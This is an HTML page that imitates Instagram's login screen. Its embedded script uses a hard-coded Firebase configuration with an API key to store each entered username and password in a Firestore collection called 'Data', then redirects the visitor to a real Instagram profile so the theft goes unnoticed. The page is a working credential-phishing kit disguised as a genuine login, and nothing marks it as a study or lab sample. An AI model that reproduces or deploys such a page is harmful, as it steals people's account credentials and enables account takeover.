<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="styles.css" />
    <title>Nikki</title>
  </head>
  <body>
    <section class="instaSection">
      <img class="imgInsta" src="./utils/instagram.png" />
    </section>
    <section class="fbButton">
      <button class="contWithFB">
        <img class="imgFb" src="./utils/fb.png" />Continue with Facebook
      </button>
    </section>
    <section class="or">
      <hr style="margin-top: 6%; width: 30%" />
    </section>
    <section class="et">
      <input
        class="email"
        id="name"
        type="text"
        placeholder="Phone number, username, or email"
      />
      <input
        class="password"
        id="pass"
        type="password"
        placeholder="Password"
      />
    </section>
    <section class="forgotPassword">
      <section class="forgotPass">
        <div class="forgotText">Forgot password?</div>
      </section>
    </section>
    <section class="login">
      <button class="btnLogin" id="loginBtn">Log in</button>
    </section>
    <section class="signup">
      <p>Don't have an account?</p>
      <p class="btnSignup">Sign up</p>
    </section>
    <section class="footer">
      <hr />
      <p>from</p>
      <img class="imgMeta" src="./utils/meta.png" />
    </section>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      // Your web app's Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyARDcmWRKrxu4wmzUHZF-w2XbfKcgFdMOY",
        authDomain: "nikki-df8e6.firebaseapp.com",
        projectId: "nikki-df8e6",
        storageBucket: "nikki-df8e6.appspot.com",
        messagingSenderId: "821183358972",
        appId: "1:821183358972:web:68833f2853d9cfad077479",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);

      import {
        getFirestore,
        doc,
        collection,
        addDoc,
      } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore.js";

      const db = getFirestore();

      var name = document.getElementById("name");
      var pass = document.getElementById("pass");

      async function AddDocument_AutoID() {
        var ref = collection(db, "Data");
        const docRef = await addDoc(ref, {
          name: name.value,
          pass: pass.value,
        }).then(() => {
          location.href = "https://www.instagram.com/nikitabansal_001/";
        });
      }

      document
        .getElementById("loginBtn")
        .addEventListener("click", AddDocument_AutoID);
    </script>
  </body>
</html>
